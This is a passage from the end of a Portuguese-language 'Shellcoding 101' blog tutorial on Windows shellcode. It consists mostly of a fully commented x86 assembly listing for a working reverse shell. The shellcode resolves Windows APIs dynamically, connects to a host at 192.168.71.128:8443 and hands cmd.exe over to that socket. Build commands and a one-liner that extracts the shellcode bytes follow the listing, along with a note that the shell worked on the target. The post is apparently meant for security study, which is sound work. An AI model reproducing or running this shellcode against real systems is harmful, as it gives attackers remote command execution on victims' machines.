    <span class="nf">push</span> <span class="mh">0x50746547</span>             <span class="c1">;movendo PteG para stack</span>
    <span class="c1">;encontrando o endereço da Export Table e armazenando em edx</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebx</span> <span class="o">+</span> <span class="mh">0x3c</span><span class="p">]</span>       <span class="c1">;conteudo de 0x3c é f8 e foi movido para edx</span>
    <span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span>                <span class="c1">;adicionado o endereço base da kernel32 a f8</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">]</span>       <span class="c1">;adicionado 0x78 (170 - f8) para obter o RVA de Image Export Directory</span>
    <span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span>                <span class="c1">;adicionado o endereço base da kernel32 para obter o endereço base de Image Export Directory</span>
    <span class="c1">;encontrando o endereço da Export Name Pointer table e armazenando em ecx</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">]</span>       <span class="c1">;adicionadno 0x20 para obter o RVA da Export Name Pointer Table</span>
    <span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ebx</span>                <span class="c1">;adicionado o endereço base da kernel32 para obter o endereço base de Export Name Pointer Table</span>
    <span class="nf">mov</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">],</span> <span class="nb">ecx</span>            <span class="c1">;movendo o endereço base de Export Name Pointer Table para a variavel [ebp-4]</span>
    <span class="c1">;encontrando o endereço de Export Address table e armazenando em edx</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x1c</span><span class="p">]</span>       <span class="c1">;adicionando 0x1c para obter o RVA da Export Address Table</span>
    <span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span>                <span class="c1">;adicionado o endereço base da kernel32 para obter o endereço base de Export Address Table</span>

<span class="c1">;encontrando o endereço da GetrProcAddress na kernel32.dll com loop</span>
        <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>                    <span class="c1">;zerando o registrador para uso no loop</span>
<span class="nl">findproc:</span>

    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>            <span class="c1">;zerando o registrador para ser usado em comparações de string</span>
    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">;movendo GetrProcAddress da stack para esi</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>        <span class="c1">;movendo o endereço base da Export Name Pointer Table para edi</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">edi</span> <span class="o">+</span> <span class="nb">eax</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>  <span class="c1">;endereço base da Export Name Pointer Table + valor ordinal * 4, edi = RVA do função buscada pelo nome</span>
    <span class="nf">add</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">ebx</span>            <span class="c1">;adicionando o endereço base da kernel32 ao RVA da função</span>
    <span class="nf">add</span> <span class="nb">cx</span><span class="p">,</span> <span class="mi">7</span>               <span class="c1">;movendo o comprimento da string GetrProcAddress para cx: GetProcAddress = 14 bytes = 7 WORD</span>
    <span class="nf">repe</span> <span class="nv">cmpsw</span>              <span class="c1">;compara o numero de WORDS no registrador cx da esquerda para direita com edi e esi, armazena a saída na flag ZF</span>
    <span class="nf">jz</span> <span class="nv">findaddr</span>             <span class="c1">;pula para findaddr e quebra o loop se a flag ZE for TRUE</span>
    <span class="nf">inc</span> <span class="nb">eax</span>                 <span class="c1">;incrementa o contador que contém o ordinal</span>
    <span class="nf">loop</span> <span class="nv">findproc</span>           <span class="c1">;loop no findproc</span>
<span class="nl">findaddr:</span>

    <span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">2</span>              <span class="c1">;aplicando a correção no contador de ebx</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="nb">eax</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>  <span class="c1">;corrigindo o valor de edi</span>
    <span class="nf">add</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">ebx</span>            <span class="c1">;adicione o endereço base do kerneldll32 ao endereço acima para obter o endereço GetProcAddress</span>
    <span class="nf">mov</span> <span class="nb">ebp</span><span class="p">,</span> <span class="nb">edi</span>            <span class="c1">;carregando o endereço da GetProcAddress em ebp</span>

<span class="nl">loadLibraryA:</span>

	<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>    <span class="c1">;zerando o registrador</span>
	<span class="nf">push</span> <span class="nb">ecx</span>        <span class="c1">;enviando 0x0 como string terminator</span>
	<span class="nf">push</span> <span class="mh">0x41797261</span> <span class="c1">;enviando Ayra para stack</span>
	<span class="nf">push</span> <span class="mh">0x7262694c</span> <span class="c1">;enviando rbiL para Stack</span>
	<span class="nf">push</span> <span class="mh">0x64616f4c</span> <span class="c1">;enviando daoL para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>        <span class="c1">;enviando ponteiro da string para stack</span>
	<span class="nf">push</span> <span class="nb">ebx</span>        <span class="c1">;enviando ponteiro da kernel32.dll para stack</span>
	<span class="nf">call</span> <span class="nb">ebp</span>        <span class="c1">;chamando GetProcAddress("kernel32.dll", "LoadLibraryA")</span>

<span class="nl">ws2_32:</span>

	<span class="nf">push</span> <span class="mh">0x4e4e3233</span>              <span class="c1">;movendo NN32 para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">],</span> <span class="mh">0x4e4e</span> <span class="c1">;removendo o "NN"</span>
	<span class="nf">push</span> <span class="mh">0x5f327377</span>              <span class="c1">;movendo _2sw para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>                     <span class="c1">;movendo ponteiro para string para a stack</span>
	<span class="nf">call</span> <span class="nb">eax</span>                     <span class="c1">;chamando LoadLibraryA(ws2_32)</span>
	<span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">eax</span>                 <span class="c1">;salvando ponteiro para ws2_32 para uso recorrente</span>

<span class="nl">WSAStartup:</span>

	<span class="nf">push</span> <span class="mh">0x4e4e7075</span>              <span class="c1">;movendo NNpu para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">],</span> <span class="mh">0x4e4e</span> <span class="c1">;removendo o "NN"</span>
	<span class="nf">push</span> <span class="mh">0x74726174</span>              <span class="c1">;movendo trat para stack</span>
	<span class="nf">push</span> <span class="mh">0x53415357</span>              <span class="c1">;movendo SASW para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>                     <span class="c1">;movendo ponteiro da string para a stack</span>
	<span class="nf">push</span> <span class="nb">esi</span>                     <span class="c1">;movendo ponteiro da ws2_32 para esi</span>
	<span class="nf">call</span> <span class="nb">ebp</span>                     <span class="c1">;chamando GetProcAddress("ws2_32.dll", "WSAStartup")</span>

<span class="nl">WSAStartupCall:</span>

	<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>    <span class="c1">;zerando registrador</span>
	<span class="nf">mov</span> <span class="nb">dx</span><span class="p">,</span> <span class="mh">0x190</span>   <span class="c1">;preparando espaço para WSADATA</span>
	<span class="nf">sub</span> <span class="nb">esp</span><span class="p">,</span> <span class="nb">edx</span>    <span class="c1">;alocando o espaço para WSADATA</span>
	<span class="nf">push</span> <span class="nb">esp</span>        <span class="c1">;movendo ponteiro para este espaço</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;enviando o parametro wVersionRequested para stack</span>
	<span class="nf">call</span> <span class="nb">eax</span>        <span class="c1">;chamando WSAStartup(MAKEWORD(2, 2), wsadata_pointer)</span>

<span class="nl">WSASocketA:</span>

	<span class="nf">push</span> <span class="mh">0x4e4e4174</span>              <span class="c1">;movendo NNAt para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">],</span> <span class="mh">0x4e4e</span> <span class="c1">;removendo o "NN"</span>
	<span class="nf">push</span> <span class="mh">0x656b636f</span>              <span class="c1">;movendo ekco para stack</span>
	<span class="nf">push</span> <span class="mh">0x53415357</span>              <span class="c1">;movendo SASW para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>                     <span class="c1">;movendo ponteiro da string para a stack</span>
	<span class="nf">push</span> <span class="nb">esi</span>                     <span class="c1">;movendo ponteiro da ws2_32 para esi</span>
	<span class="nf">call</span> <span class="nb">ebp</span>                     <span class="c1">;chamando GetProcAddress("ws2_32.dll", "`WSASocketA")</span>

<span class="nl">WSASocketACall:</span>

	<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>    <span class="c1">;zerando registrador</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;dwFlags=NULL</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;g=NULL</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;lpProtocolInfo=NULL</span>
	<span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mh">0x6</span>     <span class="c1">;edx==6</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;protocol=6</span>
	<span class="nf">sub</span> <span class="nb">dl</span><span class="p">,</span> <span class="mh">0x5</span>     <span class="c1">;edx==1</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;type=1</span>
	<span class="nf">inc</span> <span class="nb">edx</span>         <span class="c1">;edx==2</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;af=2</span>
	<span class="nf">call</span> <span class="nb">eax</span>        <span class="c1">;call WSASocketA</span>
	<span class="nf">push</span> <span class="nb">eax</span>        <span class="c1">;enviando retorno para stack</span>
	<span class="nf">pop</span> <span class="nb">edi</span>         <span class="c1">;salvando socket em edi</span>

<span class="nl">Connect:</span>

	<span class="nf">push</span> <span class="mh">0x4e746365</span>            <span class="c1">;movendo Ntce para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x3</span><span class="p">],</span> <span class="mh">0x4e</span> <span class="c1">;removendo o "N"</span>
	<span class="nf">push</span> <span class="mh">0x6e6e6f63</span>            <span class="c1">;movendo nnoc para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>                   <span class="c1">;movendo ponteiro da string para a stack</span>
	<span class="nf">push</span> <span class="nb">esi</span>                   <span class="c1">;movendo ponteiro da ws2_32 para esi</span>
	<span class="nf">call</span> <span class="nb">ebp</span>                   <span class="c1">;chamando GetProcAddress("ws2_32.dll", "connect")</span>

<span class="nl">ConnectCall:</span>

	 <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mh">0x8148A9C1</span>    <span class="c1">;movendo 192.168.71.128 + 0x01010101 para a stack</span>
	 <span class="nf">sub</span> <span class="nb">edx</span><span class="p">,</span> <span class="mh">0x01010101</span>    <span class="c1">;subtraindo 0x01010101</span>
	 <span class="nf">push</span> <span class="nb">edx</span>               <span class="c1">;movendo ponteiro da sin_addr para a stack</span>
	 <span class="nf">push</span> <span class="kt">word</span> <span class="mh">0xFB20</span>       <span class="c1">;movendo porta 8443 = 0x20FB para a stack</span>
	 <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
	 <span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mi">2</span>
	 <span class="nf">push</span> <span class="nb">dx</span>
	 <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>
	 <span class="nf">push</span> <span class="kt">byte</span> <span class="mh">0x10</span>
	 <span class="nf">push</span> <span class="nb">edx</span>
	 <span class="nf">push</span> <span class="nb">edi</span>
	 <span class="nf">call</span> <span class="nb">eax</span>               <span class="c1">;chamando connect</span>

<span class="nl">CreateProcessA:</span>

	<span class="nf">push</span> <span class="mh">0x4e4e4173</span>              <span class="c1">;movendo NNAs para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">],</span> <span class="mh">0x4e4e</span> <span class="c1">;removendo o "NN"</span>
	<span class="nf">push</span> <span class="mh">0x7365636f</span>              <span class="c1">;movendo seco para stack</span>
	<span class="nf">push</span> <span class="mh">0x72506574</span>              <span class="c1">;movendo rPet para stack</span>
	<span class="nf">push</span> <span class="mh">0x61657243</span>              <span class="c1">;movendo aerC para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>                     <span class="c1">;movendo ponteiro da string para a stack</span>
	<span class="nf">push</span> <span class="nb">ebx</span>                     <span class="c1">;movendo ponteiro da kernel32 para esi</span>
	<span class="nf">call</span> <span class="nb">ebp</span>                     <span class="c1">;chamando GetProcAddress("kernel32.dll", "CreateProcessA")</span>
	<span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">ebx</span>                 <span class="c1">;salvando kernel32 em um novo ponteiro</span>

<span class="nl">cmd:</span>

	<span class="nf">push</span> <span class="mh">0x4e646d63</span>            <span class="c1">;movendo Ndmc para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x3</span><span class="p">],</span> <span class="mh">0x4e</span> <span class="c1">;removendo o "N"</span>
	<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>               <span class="c1">;movendo ponteiro da string para a stack</span>
        <span class="c1">;configurando a estrutura STARTUPINFO</span>
	<span class="nf">push</span> <span class="nb">edi</span>                   <span class="c1">;preenchendo o argumento hStdError com o socket</span>
	<span class="nf">push</span> <span class="nb">edi</span>                   <span class="c1">;preenchendo o argumento hStdOutput com o socket</span>
	<span class="nf">push</span> <span class="nb">edi</span>                   <span class="c1">;preenchendo o argumento hStdInput com o socket</span>
	<span class="nf">xor</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">edi</span>               <span class="c1">;limpando edi par usar com os NULLs que precisamos</span>
	<span class="nf">push</span> <span class="kt">byte</span> <span class="mh">0x12</span>             <span class="c1">;enviaremos 18 * 4 = 72 null bytes para stack (tamanho da estrutura da STARTUPINFOA)</span>
	<span class="nf">pop</span> <span class="nb">ecx</span>                    <span class="c1">;preparando ecx para o loop</span>

<span class="nl">looper:</span>

	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;enviando uma dword null para stack</span>
	<span class="nf">loop</span> <span class="nv">looper</span>                      <span class="c1">;fazendo o loop até enviar para stack os nulls suficientes</span>
	<span class="nf">mov</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x3c</span><span class="p">],</span> <span class="mh">0x0101</span>    <span class="c1">;configurando dwFlags para STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW</span>
	<span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">],</span> <span class="mh">0x44</span>      <span class="c1">;configurando cb com o tamanho da estrutura 0x44 = 68 decimal</span>
	<span class="nf">lea</span> <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">]</span>            <span class="c1">;configurando ecx como um ponteiro para a estrutura STARTUPINFO</span>
	<span class="c1">;montando e chamando CreateProcessA</span>
	<span class="nf">push</span> <span class="nb">esp</span>                         <span class="c1">;enviando ponteiro da PROCESS_INFORMATION para stack</span>
	<span class="nf">push</span> <span class="nb">ecx</span>                         <span class="c1">;enviando ponteiro da STARTUPINFOA para stack</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento lpCurrentDirectory será NULL então o processo inicializará no mesmo diretório do processo pai</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento lpEnvironment será NULL então o processo terá o mesmo ambiente do processo pai</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento dwCreationFlags será NULL</span>
	<span class="nf">inc</span> <span class="nb">edi</span>                          <span class="c1">;edi==1</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento bInheritHandles=TURE</span>
	<span class="nf">dec</span> <span class="nb">edi</span>                          <span class="c1">;edi==0</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento lpThreadAttributes será NULL</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento lpProcessAttributes será NULL</span>
	<span class="nf">push</span> <span class="nb">ebx</span>                         <span class="c1">;argumento lpCommandLine apontará para "cmd,0"</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento lpApplicationName será NULL</span>
	<span class="nf">call</span> <span class="nb">eax</span>                         <span class="c1">;chamando CreateProcessA</span>

<span class="nl">ExitProcess:</span>

	<span class="nf">push</span> <span class="mh">0x4e737365</span>            <span class="c1">;movendo Nsse para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x3</span><span class="p">],</span> <span class="mh">0x4e</span> <span class="c1">;removendo o "N"</span>
	<span class="nf">push</span> <span class="mh">0x636f7250</span>            <span class="c1">;movendo corP para stack</span>
	<span class="nf">push</span> <span class="mh">0x74697845</span>            <span class="c1">;movendo tixE para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>                   <span class="c1">;movendo ponteiro da string para a stack</span>
	<span class="nf">push</span> <span class="nb">esi</span>                   <span class="c1">;movendo ponteiro da kernel32 para esi</span>
	<span class="nf">call</span> <span class="nb">ebp</span>                   <span class="c1">;chamando GetProcAddress("kernel32.dll", "ExitProcess")</span>

	<span class="c1">;chamando ExitProcess</span>
	<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>               <span class="c1">;zerando registrador</span>
	<span class="nf">push</span> <span class="nb">ecx</span>                   <span class="c1">;enviando 0x00 para stack</span>
	<span class="nf">call</span> <span class="nb">eax</span>                   <span class="c1">;chamando ExitProcess</span>
</pre></table></code></div></div><p>Agora podemos compilá-lo no próprio Linux:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nasm <span class="nt">-f</span> elf shell.asm
<span class="nv">$ </span>ld <span class="nt">-m</span> elf_i386 <span class="nt">-o</span> shell shell.o
<span class="nv">$ </span>objdump <span class="nt">-M</span> intel <span class="nt">-d</span> shell
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240723093651.png" alt="" /></p><p>Para transformar o programa em <em>shellcode</em>, utilizaremos o mesmo <em>oneliner</em> de sempre:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>objdump <span class="nt">-d</span> shell | <span class="nb">grep</span> <span class="s1">'^ '</span> | <span class="nb">cut</span> <span class="nt">-f2</span><span class="si">)</span><span class="p">;</span><span class="k">do </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'\x'</span><span class="nv">$i</span><span class="p">;</span><span class="k">done</span><span class="p">;</span><span class="nb">echo</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240723093753.png" alt="" /></p><p>Agora podemos injetar o <em>shellcode</em> em nosso programa de testes, e testá-lo na máquina alvo.</p><p>Uma vez que tudo esteja pronto, ao compilarmos o programa e executarmos na máquina Windows alvo, com um listener ouvindo no <em>socket</em> configurado, temos o <em>reverse shell</em>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240723093252.png" alt="" /></p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240723093344.png" alt="" /></p><p>Temos um <em>reverse shell</em> funcional como o <em>shellcode</em> chamando as APIs do Windows.</p><h3 id="considerações">Considerações</h3><p>Estes são os passos primordiais para um bom <em>shellcode</em> no ambiente Windows com endereços dinâmicos. No exemplo desenvolvido, foi utilizada a função <code class="language-plaintext highlighter-rouge">WinExec()</code>, porém existe uma infinidade de funções úteis, como <code class="language-plaintext highlighter-rouge">CreateProcess()</code>, <code class="language-plaintext highlighter-rouge">GetProcess()</code>, entre outras. Os passos mais importantes são o de encontrar o endereço base da kernel32.dll, entender a estrutura interna desta DLL e entender como funcionam as estruturas <code class="language-plaintext highlighter-rouge">TEB</code> e <code class="language-plaintext highlighter-rouge">PEB</code>.</p><h1 id="conclusão">Conclusão</h1><p>Neste artigo, foram explorados os fundamentos do desenvolvimento de <em>shellcodes</em>, com um foco particular no ambiente Windows e na manipulação de endereços dinâmicos. Inicialmente, apresentou-se o conceito de <em>shellcoding</em>, destacando sua importância no contexto da cibersegurança e da exploração de vulnerabilidades. Em seguida, detalharam-se os conceitos básicos, incluindo registradores, instruções de assembly e chamadas de sistema, proporcionando uma base sólida para os leitores.</p><p>A investigação aprofundada da estrutura interna da DLL kernel32.dll permitiu a identificação e utilização de funções críticas como <code class="language-plaintext highlighter-rouge">WinExec()</code>. Por meio de uma análise detalhada, foi demonstrado como localizar os RVAs (<em>Relative Virtual Addresses</em>) das funções e aplicar essas técnicas na criação de <em>shellcodes</em> robustos e eficazes.</p><p>Além disso, discutiu-se a importância das estruturas <code class="language-plaintext highlighter-rouge">TEB</code> e <code class="language-plaintext highlighter-rouge">PEB</code> e como elas são fundamentais para navegar pelo espaço de endereçamento do Windows. Embora o exemplo tenha se concentrado na função <code class="language-plaintext highlighter-rouge">WinExec()</code>, o mesmo princípio pode ser aplicado a uma variedade de outras funções úteis, como <code class="language-plaintext highlighter-rouge">CreateProcess()</code> e <code class="language-plaintext highlighter-rouge">GetProcess()</code>. Esse conhecimento é crucial para a criação de <em>shellcodes</em> adaptáveis e resistentes a mudanças no ambiente de execução.</p><p>Ao longo do artigo, foi enfatizada a importância de compreender a mecânica interna dos sistemas operacionais e de adotar uma abordagem <em>hacker</em> para explorar vulnerabilidades de forma criativa e eficaz. O desenvolvimento de <em>shellcodes</em> não é apenas uma habilidade técnica, mas também uma arte que exige engenhosidade e precisão. Este artigo visa fornecer aos leitores as ferramentas e o conhecimento necessários para aprofundar suas habilidades de hacking.</p><p>Espera-se que este artigo tenha proporcionado um entendimento claro e detalhado sobre o desenvolvimento de <em>shellcodes</em>, oferecendo tanto aos iniciantes quanto aos profissionais experientes uma visão aprofundada das técnicas envolvidas. Continuar explorando e praticando essas habilidades é essencial para aprimorar a capacidade de identificar e mitigar vulnerabilidades de segurança, desempenhando um papel crucial na proteção de sistemas e redes contra ameaças cada vez mais sofisticadas.</p><h1 id="referências">Referências</h1><ul><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress">https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb">https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb">https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data">https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32">https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/estudos/'>Estudos</a>, <a href='/categories/shellcoding/'>Shellcoding</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/shellcoding/" class="post-tag no-text-decoration" >Shellcoding</a> <a href="/tags/shellcode/" class="post-tag no-text-decoration" >Shellcode</a> <a href="/tags/windows-api/" class="post-tag no-text-decoration" >Windows API</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/kernel/" class="post-tag no-text-decoration" >Kernel</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Shellcoding 101 - H41stur&url=https://h41stur.github.io/posts/shellcoding101/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Shellcoding 101 - H41stur&u=https://h41stur.github.io/posts/shellcoding101/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Shellcoding 101 - H41stur&url=https://h41stur.github.io/posts/shellcoding101/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://h41stur.github.io/posts/shellcoding101/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div><div> <script src="https://utteranc.es/client.js" repo="h41stur/h41stur.github.io" issue-term="url" theme="photon-dark" crossorigin="anonymous" async> </script></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/process-injection/">Process Injection 101</a><li><a href="/posts/evasao-av/">Evasão de Antivírus - Princípios Gerais e Abordagens Específicas</a><li><a href="/posts/paper-heap/">Heap Exploitation P.1</a><li><a href="/posts/shellcoding101/">Shellcoding 101</a><li><a href="/posts/replay-sinal-rf/">Uma Jornada no Hardware Hacking: Criando um Clonador de Sinais RF</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/evasao-av/"><div class="card-body"> <span class="timeago small" >Jul 24, 2024<i class="unloaded">2024-07-24T01:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Evasão de Antivírus - Princípios Gerais e Abordagens Específicas</h3><div class="text-muted small"><p> TL;DR Este artigo explora diversas técnicas de evasão de antivírus (AV), 